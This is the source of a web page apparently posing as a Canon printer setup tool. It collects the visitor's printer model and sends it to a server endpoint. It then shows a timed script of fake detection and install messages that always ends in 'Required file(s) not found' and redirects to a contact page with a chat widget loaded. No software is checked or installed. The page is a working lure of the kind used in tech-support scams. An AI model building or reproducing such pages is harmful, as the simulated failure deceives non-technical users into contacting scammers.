<!DOCTYPE html>
<html>
<head>
  <title>Canon Setup</title>
</head>
<body>

<div id="formBox">
  <h3>Enter Canon Printer Model</h3>
  <input id="printerModel" placeholder="e.g. Canon Pixma G3010">
  <button id="startBtn">Start Setup</button>
</div>

<div id="loadingBox" style="display:none;">
  <h3>Processing Canon Printerâ€¦</h3>
  <div id="stepContent"></div>
</div>

<script>
document.getElementById("startBtn").addEventListener("click", async function () {
  const model = document.getElementById("printerModel").value.trim();
  if (!model) {
    alert("Please enter printer model");
    return;
  }

  // Save model for contact page
  sessionStorage.setItem("printerModel", model);

  // ðŸ“§ SEND MODEL MAIL
  await fetch("/api/send-model", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      printerModel: model,
      brand: "Canon"
    })
  });

  document.getElementById("formBox").style.display = "none";
  document.getElementById("loadingBox").style.display = "block";

  const steps = [
    "Detecting Canon connectionâ€¦",
    "Checking Canon requirementsâ€¦",
    "Preparing Canon installâ€¦",
    "Installing Canon softwareâ€¦",
    "Required file(s) not found"
  ];

  let i = 0;
  function next() {
    document.getElementById("stepContent").innerText = steps[i++];
    if (i < steps.length) {
      setTimeout(next, 2500);
    } else {
      setTimeout(() => {
       window.location.href = "/contact.html";
      }, 2500);
    }
  }
  next();
});
</script>
<script src="/smartsupp.js"></script>
</body>
</html>
